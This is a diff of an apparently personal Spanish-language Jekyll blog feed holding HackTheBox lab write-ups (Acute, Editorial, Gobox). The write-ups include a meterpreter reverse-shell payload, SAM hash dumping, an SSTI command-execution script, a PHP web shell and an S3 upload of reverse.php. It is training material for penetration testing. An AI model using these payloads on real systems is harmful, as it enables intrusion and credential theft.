@@ -1,75 +1,5 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.9.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2024-06-24T12:56:15-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Armando Villalobos</title><subtitle>Esto es una página de prueba de hacking
-</subtitle><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><entry><title type="html">Axlle</title><link href="http://localhost:4000/machines/axlle.html" rel="alternate" type="text/html" title="Axlle" /><published>2024-06-23T00:00:00-06:00</published><updated>2024-06-23T00:00:00-06:00</updated><id>http://localhost:4000/machines/axlle</id><content type="html" xml:base="http://localhost:4000/machines/axlle.html"><![CDATA[<p>Los primero pasos es escanear la máquina para saber que puertos están abiertos.</p>
-
-<pre><code class="language-cmd">sudo nmap -p25,53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49668,51585,61835,61836,61838,65168 -sCV 10.10.1
-1.21 -oN targeted
-Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-23 21:22 CST
-Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
-Service scan Timing: About 73.91% done; ETC: 21:23 (0:00:16 remaining)
-Nmap scan report for 10.10.11.21
-Host is up (0.080s latency).
-
-PORT      STATE SERVICE       VERSION
-25/tcp    open  smtp          hMailServer smtpd
-| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP
-|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
-53/tcp    open  domain        Simple DNS Plus
-80/tcp    open  http          Microsoft IIS httpd 10.0
-|_http-server-header: Microsoft-IIS/10.0
-| http-methods: 
-|_  Potentially risky methods: TRACE
-|_http-title: Axlle Development
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-24 03:23:02Z)
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)
-445/tcp   open  microsoft-ds?
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  tcpwrapped
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)
-3269/tcp  open  tcpwrapped
-3389/tcp  open  ms-wbt-server Microsoft Terminal Services
-| ssl-cert: Subject: commonName=MAINFRAME.axlle.htb
-| Not valid before: 2024-05-19T11:25:03
-|_Not valid after:  2024-11-18T11:25:03
-| rdp-ntlm-info: 
-|   Target_Name: AXLLE
-|   NetBIOS_Domain_Name: AXLLE
-|   NetBIOS_Computer_Name: MAINFRAME
-|   DNS_Domain_Name: axlle.htb
-|   DNS_Computer_Name: MAINFRAME.axlle.htb
-|   DNS_Tree_Name: axlle.htb
-|   Product_Version: 10.0.20348
-|_  System_Time: 2024-06-24T03:23:52+00:00
-|_ssl-date: 2024-06-24T03:24:31+00:00; +2s from scanner time.
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-9389/tcp  open  mc-nmf        .NET Message Framing
-49664/tcp open  msrpc         Microsoft Windows RPC
-49668/tcp open  msrpc         Microsoft Windows RPC
-51585/tcp open  msrpc         Microsoft Windows RPC
-61835/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-61836/tcp open  msrpc         Microsoft Windows RPC
-61838/tcp open  msrpc         Microsoft Windows RPC
-65168/tcp open  msrpc         Microsoft Windows RPC
-Service Info: Host: MAINFRAME; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-|_clock-skew: mean: 2s, deviation: 0s, median: 2s
-| smb2-security-mode: 
-|   311: 
-|_    Message signing enabled and required
-| smb2-time: 
-|   date: 2024-06-24T03:23:53
-|_  start_date: N/A
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 99.26 seconds
-</code></pre>
-
-<p><img src="/assets/img/machines/axlle/axlle.jpg" alt="imagen1" /></p>]]></content><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><category term="machines" /><summary type="html"><![CDATA[Los primero pasos es escanear la máquina para saber que puertos están abiertos.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/machines/axlle/logo.png" /><media:content medium="image" url="http://localhost:4000/assets/img/machines/axlle/logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Editorial</title><link href="http://localhost:4000/machines/editorial.html" rel="alternate" type="text/html" title="Editorial" /><published>2024-06-23T00:00:00-06:00</published><updated>2024-06-23T00:00:00-06:00</updated><id>http://localhost:4000/machines/editorial</id><content type="html" xml:base="http://localhost:4000/machines/editorial.html"><![CDATA[<p>Los primero pasos es escanear la máquina para saber que puertos están abiertos.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.9.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2024-06-27T10:31:55-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Armando Villalobos</title><subtitle>Cybersecurity enthusiast
+</subtitle><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><entry><title type="html">Editorial</title><link href="http://localhost:4000/blog/machines/2024-06-23-editorial/" rel="alternate" type="text/html" title="Editorial" /><published>2024-06-23T00:00:00-06:00</published><updated>2024-06-23T00:00:00-06:00</updated><id>http://localhost:4000/blog/machines/editorial</id><content type="html" xml:base="http://localhost:4000/blog/machines/2024-06-23-editorial/"><![CDATA[<p>Los primero pasos es escanear la máquina para saber que puertos están abiertos.</p>
 
 <pre><code class="language-cmd"># Nmap 7.93 scan initiated Sun Jun 23 19:10:57 2024 as: nmap -p22,80 -sCV -oN targeted 10.10.11.20
 Nmap scan report for editorial.htb (10.10.11.20)
@@ -455,7 +385,7 @@ bash-5.1<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l
 bash-5.1<span class="nv">$ </span>bash <span class="nt">-p</span>
 bash-5.1# <span class="nb">whoami
 </span>root
-</code></pre></div></div>]]></content><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><category term="machines" /><summary type="html"><![CDATA[Los primero pasos es escanear la máquina para saber que puertos están abiertos.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/machines/editorial/logo.png" /><media:content medium="image" url="http://localhost:4000/assets/img/machines/editorial/logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">OSCP</title><link href="http://localhost:4000/certifications/oscp.html" rel="alternate" type="text/html" title="OSCP" /><published>2024-06-21T00:00:00-06:00</published><updated>2024-06-21T00:00:00-06:00</updated><id>http://localhost:4000/certifications/oscp</id><content type="html" xml:base="http://localhost:4000/certifications/oscp.html"><![CDATA[<p>El certificado que más me consto económica y mentalmente.</p>]]></content><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><category term="certifications" /><summary type="html"><![CDATA[El certificado que más me consto económica y mentalmente.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/certifications/OSCP.png" /><media:content medium="image" url="http://localhost:4000/assets/img/certifications/OSCP.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Acute</title><link href="http://localhost:4000/machine.html" rel="alternate" type="text/html" title="Acute" /><published>2024-06-20T00:00:00-06:00</published><updated>2024-06-20T00:00:00-06:00</updated><id>http://localhost:4000/machine</id><content type="html" xml:base="http://localhost:4000/machine.html"><![CDATA[<p>Lo más relevante de esta máquina fue</p>
+</code></pre></div></div>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="machines" /><category term="htb" /><summary type="html"><![CDATA[Los primero pasos es escanear la máquina para saber que puertos están abiertos.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/machines/editorial/logo.JPG" /><media:content medium="image" url="http://localhost:4000/assets/img/machines/editorial/logo.JPG" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">OSCP</title><link href="http://localhost:4000/blog/certificates/2024-06-21-oscp/" rel="alternate" type="text/html" title="OSCP" /><published>2024-06-21T00:00:00-06:00</published><updated>2024-06-21T00:00:00-06:00</updated><id>http://localhost:4000/blog/certificates/oscp</id><content type="html" xml:base="http://localhost:4000/blog/certificates/2024-06-21-oscp/"><![CDATA[<p>El certificado que más me consto económica y mentalmente.</p>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="certificates" /><summary type="html"><![CDATA[El certificado que más me consto económica y mentalmente.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/certifications/OSCP.png" /><media:content medium="image" url="http://localhost:4000/assets/img/certifications/OSCP.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Acute</title><link href="http://localhost:4000/blog/example/2024-06-20-machine/" rel="alternate" type="text/html" title="Acute" /><published>2024-06-20T00:00:00-06:00</published><updated>2024-06-20T00:00:00-06:00</updated><id>http://localhost:4000/blog/example/machine</id><content type="html" xml:base="http://localhost:4000/blog/example/2024-06-20-machine/"><![CDATA[<p>Lo más relevante de esta máquina fue</p>
 
 <p>pudimos usar <code class="language-plaintext highlighter-rouge">exiftools</code> para poder ver los metadatos del archivo encontrado en la web</p>
 
@@ -508,68 +438,144 @@ WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8
 que indica que cada 5 min ejecuta el archivo .bat, con Set-Content podemos crearnos un arcbivo asignando a nuestro usuario al grupo de domain_admins, utilizamos Siteadmin porque según la desripción
 este grupo tiene los privilegios del grupo domain admins.</p>
 
-<p><img src="/assets/img/blog/Acute1.jpg" alt="imagen1" /></p>
+<p><img src="/assets/img/blog/acute1.jpg" alt="imagen1" /></p>
 
 <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Command <span class="nt">-ComputerName</span> ATSSERVER <span class="nt">-ConfigurationName</span> dc_manage <span class="nt">-Credential</span> <span class="nv">$cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span><span class="nb">type </span>C:<span class="se">\P</span>ROGRA~1<span class="se">\k</span>eepmeon<span class="se">\k</span>eepmeon.bat<span class="o">}</span>
 Invoke-Command <span class="nt">-ComputerName</span> ATSSERVER <span class="nt">-ConfigurationName</span> dc_manage <span class="nt">-Credential</span> <span class="nv">$cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span>Set-Content C:<span class="se">\P</span>ROGRA~1<span class="se">\k</span>eepmeon<span class="se">\p</span>wned.bat <span class="nt">-Value</span> <span class="s1">'net group Site_Admin awallace /domain /add'</span><span class="o">}</span>
-</code></pre></div></div>]]></content><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><summary type="html"><![CDATA[Version 9.1 provides minor design changes, new features, and closes multiple issues.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/acutepng.png" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/acutepng.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Acute</title><link href="http://localhost:4000/machines/machine.html" rel="alternate" type="text/html" title="Acute" /><published>2024-06-20T00:00:00-06:00</published><updated>2024-06-20T00:00:00-06:00</updated><id>http://localhost:4000/machines/machine</id><content type="html" xml:base="http://localhost:4000/machines/machine.html"><![CDATA[<p>Lo más relevante de esta máquina fue</p>
+</code></pre></div></div>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="example" /><summary type="html"><![CDATA[Version 9.1 provides minor design changes, new features, and closes multiple issues.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/jj-ying.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/jj-ying.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">CPTS</title><link href="http://localhost:4000/blog/certificates/2023-07-14-cpts/" rel="alternate" type="text/html" title="CPTS" /><published>2023-07-14T00:00:00-06:00</published><updated>2023-07-14T00:00:00-06:00</updated><id>http://localhost:4000/blog/certificates/cpts</id><content type="html" xml:base="http://localhost:4000/blog/certificates/2023-07-14-cpts/"><![CDATA[<p>El certificado que más me consto económica y mentalmente.</p>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="certificates" /><summary type="html"><![CDATA[El certificado que más me consto económica y mentalmente.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/certifications/CPTS.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/certifications/CPTS.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">PNPT</title><link href="http://localhost:4000/blog/certificates/2023-06-01-pnpt/" rel="alternate" type="text/html" title="PNPT" /><published>2023-06-01T00:00:00-06:00</published><updated>2023-06-01T00:00:00-06:00</updated><id>http://localhost:4000/blog/certificates/pnpt</id><content type="html" xml:base="http://localhost:4000/blog/certificates/2023-06-01-pnpt/"><![CDATA[<p>El certificado que más me consto económica y mentalmente.</p>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="certificates" /><summary type="html"><![CDATA[El certificado que más me consto económica y mentalmente.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/certifications/PNPT.png" /><media:content medium="image" url="http://localhost:4000/assets/img/certifications/PNPT.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Gobox</title><link href="http://localhost:4000/blog/machines/2022-09-29-gobox/" rel="alternate" type="text/html" title="Gobox" /><published>2022-09-29T00:00:00-05:00</published><updated>2022-09-29T00:00:00-05:00</updated><id>http://localhost:4000/blog/machines/gobox</id><content type="html" xml:base="http://localhost:4000/blog/machines/2022-09-29-gobox/"><![CDATA[<p>Vemos el puerto 80 y 8080, donde en el puerto 80 no encontramos nada interesante pero en el 8080 encontramos un login.</p>
 
-<p>pudimos usar <code class="language-plaintext highlighter-rouge">exiftools</code> para poder ver los metadatos del archivo encontrado en la web</p>
+<p><img src="/assets/img/machines/gobox/gobox.png" alt="imagen1" /></p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exiftools document.docx
+<p><img src="/assets/img/machines/gobox/gobox2.png" alt="imagen2" />
+En este punto vemos por medio de burpsuite que estamos en un servidor golang e intentamos un ssti.</p>
+
+<p><img src="/assets/img/machines/gobox/gobox3.png" alt="imagen3" /></p>
+
+<p><img src="/assets/img/machines/gobox/gobox4.png" alt="imagen4" /></p>
+
+<p>Con un “{{ . }}” obtenemos un correo y una contraseña por lo que lo usamos en el login y dentro encontramos una función que nos permite mediante el input inyectar comandos.</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="p">(</span><span class="n">u</span> <span class="n">User</span><span class="p">)</span> <span class="n">DebugCmd</span> <span class="p">(</span><span class="n">test</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
+  <span class="n">ipp</span> <span class="o">:=</span> <span class="n">strings</span><span class="o">.</span><span class="n">Split</span><span class="p">(</span><span class="n">test</span><span class="p">,</span> <span class="s">" "</span><span class="p">)</span>
+  <span class="n">bin</span> <span class="o">:=</span> <span class="n">strings</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">ipp</span><span class="p">[</span><span class="o">:</span><span class="m">1</span><span class="p">],</span> <span class="s">" "</span><span class="p">)</span>
+  <span class="n">args</span> <span class="o">:=</span> <span class="n">strings</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">ipp</span><span class="p">[</span><span class="m">1</span><span class="o">:</span><span class="p">],</span> <span class="s">" "</span><span class="p">)</span>
+  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">&gt;</span> <span class="m">0</span><span class="p">{</span>
+    <span class="n">out</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="n">bin</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span><span class="o">.</span><span class="n">CombinedOutput</span><span class="p">()</span>
+    <span class="k">return</span> <span class="kt">string</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="n">out</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="n">bin</span><span class="p">)</span><span class="o">.</span><span class="n">CombinedOutput</span><span class="p">()</span>
+    <span class="k">return</span> <span class="kt">string</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+  <span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div></div>
 
-<p>Ganamos acceso a la máquina y usamos metaexploit para poder user <code class="language-plaintext highlighter-rouge">screenshare</code></p>
+<p>Por el ssti nos permite llamar a objetos y funciones internas del código existente, por lo que pegamos la función y el comando para ejecutar comandos.</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/meterpreter_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.16.8 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="nt">-o</span> msf.exe
+<p><img src="/assets/img/machines/gobox/gobox5.png" alt="imagen5" /></p>
 
-<span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> <span class="o">&gt;&gt;</span> use exploit/multi/handler
-<span class="nb">set </span>payload windows/x64/meterpreter_reverse_tcp
-<span class="nb">set </span>LHOST 10.10.10.10
-<span class="nb">set </span>LPORT 443
+<p>En este punto para práctica nos montamos un script en python para poder ejecutar comandos más facilmente.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">requests</span><span class="p">,</span> <span class="n">pdb</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">time</span>
+
+<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">Saliendo...</span><span class="se">\n\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+
+<span class="c1">#Variables Globales
+</span><span class="n">main_url</span> <span class="o">=</span> <span class="s">"http://10.10.11.113:8080/forgot/"</span>
+
+<span class="c1">#CTRL+C
+</span><span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">makerequest</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
+    <span class="n">data_post</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">'email'</span><span class="p">:</span><span class="s">"test@{\{ .DebugCmd "</span> <span class="o">%</span><span class="n">s</span> <span class="s">" }\}"</span> <span class="o">%</span> <span class="n">command</span>
+    <span class="p">}</span>
+    
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">main_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data_post</span><span class="p">)</span>
+
+    <span class="n">output</span> <span class="o">=</span> <span class="p">((</span><span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'Email Sent To:(.*)\s+&lt;button class'</span><span class="p">,</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">))[</span><span class="mi">0</span><span class="p">].</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n\n</span><span class="s">             "</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)).</span><span class="n">replace</span><span class="p">(</span><span class="s">"test@"</span><span class="p">,</span><span class="s">""</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+    
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">)</span>
+        <span class="n">command</span> <span class="o">=</span> <span class="n">command</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="n">makerequest</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>      
 
 </code></pre></div></div>
 
-<p>Tenemos una constraseñas del usuari imonk, procedemos a utilizar pscredentials</p>
+<p>Al hacer un <code class="language-plaintext highlighter-rouge">hostname -i</code> vemos que se llama <code class="language-plaintext highlighter-rouge">aws</code> por lo que procedemo a aplicar comando en aws. Nos encontramos credenciales en <code class="language-plaintext highlighter-rouge">.aws</code> y en <code class="language-plaintext highlighter-rouge">env</code> para que podamos conectarnos en nuestra máquina.</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$passwd</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'W3_4R3_th3_f0rce'</span> <span class="nt">-AsPlaintext</span> <span class="nt">-Force</span>
-<span class="nv">$cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'acute\imonks'</span>,<span class="nv">$passwd</span><span class="o">)</span>
-Invoke-Command <span class="nt">-ComputerName</span> ATSSERVER <span class="nt">-ConfigurationName</span> dc_manage <span class="nt">-Credential</span> <span class="nv">$cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span><span class="nb">whoami</span><span class="o">}</span>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span><span class="nb">cat</span> ~/.aws/credentials
+ <span class="o">[</span>default]
+<span class="nv">aws_access_key_id</span><span class="o">=</span>SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
+<span class="nv">aws_secret_access_key</span><span class="o">=</span>SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
+
+<span class="o">&gt;</span><span class="nb">env
+ </span><span class="nv">HOSTNAME</span><span class="o">=</span>aws
+<span class="nv">PWD</span><span class="o">=</span>/opt/uhc
+<span class="nv">HOME</span><span class="o">=</span>/root
+<span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span>SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
+<span class="nv">SHLVL</span><span class="o">=</span>0
+<span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span>SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
+<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+<span class="nv">DEBIAN_FRONTEND</span><span class="o">=</span>noninteractive
 </code></pre></div></div>
 
-<p>Obteniendo un script que podemos manipular, podemos modificarlo para entablarnos una reverse shell, utilizamos el mismo que teníamos en la carpeta Utils.</p>
+<p>Nos conectamos desde nuestra máquina</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Command <span class="nt">-ComputerName</span> ATSSERVER <span class="nt">-ConfigurationName</span> dc_manage <span class="nt">-Credential</span> <span class="nv">$cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{((</span>Get-Content C:<span class="se">\U</span>sers<span class="se">\i</span>monks<span class="se">\D</span>esktop<span class="se">\w</span>m.ps1 <span class="nt">-Raw</span><span class="o">)</span> 
-<span class="nt">-Replace</span> <span class="s1">'Get-Volume'</span>,<span class="s1">'cmd.exe /c C:\Utils\shell.exe'</span><span class="o">)</span> | Set-Content <span class="nt">-Path</span> C:<span class="se">\U</span>sers<span class="se">\i</span>monks<span class="se">\D</span>esktop<span class="se">\w</span>m.ps1<span class="o">}</span>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span>aws s3 <span class="nb">ls
+ </span>2022-09-30 05:32:15 website
+
+<span class="o">&gt;</span>aws s3 <span class="nb">ls </span>s3://website
+                            PRE css/
+2022-09-30 05:32:16    1294778 bottom.png
+2022-09-30 05:32:15     165551 header.png
+2022-09-30 05:32:15          5 index.html
+2022-09-30 05:32:15       1803 index.php
 </code></pre></div></div>
 
-<p>Ganamos acceso como otro usuario, podemos hacer lo siguiente ya que está dentro del grupo administradores, podemos intentar obtener los hashes de los usuarios con 
-<code class="language-plaintext highlighter-rouge">secretsdump</code></p>
+<p>Dentro de index.html vemos que dice test y yendo hacia la página principal y poniendo index.html nos pone test, por lo que podríamos subir un archivo para ejecutar comando en php.</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg save HKLM<span class="se">\S</span>AM sam.backup
-reg save HKLM<span class="se">\S</span>YSTEM system.backup
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?</span> <span class="s2">"&lt;pre&gt; .  shell_exec(</span><span class="nv">$_REQUEST['cmd']</span><span class="s2">) . "</span><span class="o">&lt;/</span><span class="n">pre</span><span class="o">&gt;</span><span class="p">;</span>
 </code></pre></div></div>
 
-<p>Incluso con metasploit podremos obtener los hashes y podemos intentar crackearlos para obtener la contraseña.</p>
+<p>Mediante <code class="language-plaintext highlighter-rouge">base64</code> nos pasamos el contenido lo ponemos en la máquina víctima.</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashdump
-
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
-WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span>aws s3 <span class="nb">cp</span> /tmp/reverse.php s3://website/reverse.php
+upload: ../../tmp/reverse.php to s3://website/reverse.php
 </code></pre></div></div>
 
-<p>Con la contraseña podemos tener acceso a otro usuario por lo que revisando la máquina, vemos que hay un archivo en program files
-que indica que cada 5 min ejecuta el archivo .bat, con Set-Content podemos crearnos un arcbivo asignando a nuestro usuario al grupo de domain_admins, utilizamos Siteadmin porque según la desripción
-este grupo tiene los privilegios del grupo domain admins.</p>
+<p><img src="/assets/img/machines/gobox/gobox6.png" alt="imagen6" /></p>
 
-<p><img src="/assets/img/blog/Acute1.jpg" alt="imagen1" /></p>
+<p>Nos entablamos una reverse shell y estamos dentro.</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Command <span class="nt">-ComputerName</span> ATSSERVER <span class="nt">-ConfigurationName</span> dc_manage <span class="nt">-Credential</span> <span class="nv">$cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span><span class="nb">type </span>C:<span class="se">\P</span>ROGRA~1<span class="se">\k</span>eepmeon<span class="se">\k</span>eepmeon.bat<span class="o">}</span>
